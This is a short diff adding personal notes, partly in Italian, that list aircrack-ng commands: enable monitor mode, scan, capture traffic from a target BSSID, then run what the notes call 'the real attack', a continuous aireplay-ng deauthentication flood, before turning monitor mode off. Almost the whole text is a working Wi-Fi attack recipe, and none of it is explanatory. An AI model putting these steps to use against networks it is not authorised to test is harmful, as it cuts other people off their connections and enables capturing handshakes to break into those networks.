@@ -1,0 +1,9 @@
+airmon-ng start wlo1 (enable monitor mode)
+airodump-ng wlo1mon
+--m per vedere i dettagli
+airodump-ng -c CH -w filename --bssid BSSID wlo1mon --ignore-negative-one
+in un'altra finestra andiamo a fare il vero attacco : 
+
+aireplay-ng -0 0 -a BSSID wlo1mon --ignore-negative-one
+
+airmon-ng stop wlo1mon (DISABLE MONITOR MODE, REENTERING STATION MODE)
